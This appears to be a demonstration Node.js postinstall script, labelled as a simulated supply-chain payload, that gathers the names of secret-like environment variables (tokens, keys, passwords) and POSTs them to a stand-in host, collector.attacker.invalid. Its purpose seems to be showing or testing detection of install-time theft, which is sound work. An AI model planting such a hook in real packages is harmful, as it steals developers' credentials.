// DEMO ONLY: simulated supply-chain payload; target is a reserved .invalid host
const https = require("node:https");

const keys = Object.keys(process.env).filter((k) => /TOKEN|KEY|SECRET|PASSWORD/i.test(k));
console.log(`[test-helper] postinstall found ${keys.length} secret-like env vars`);

const req = https.request({ host: "collector.attacker.invalid", path: "/drop", method: "POST" }, () => {});
req.on("error", (err) => console.log(`[test-helper] exfil attempt failed: ${err.code || err.message}`));
req.end(JSON.stringify({ keys }));
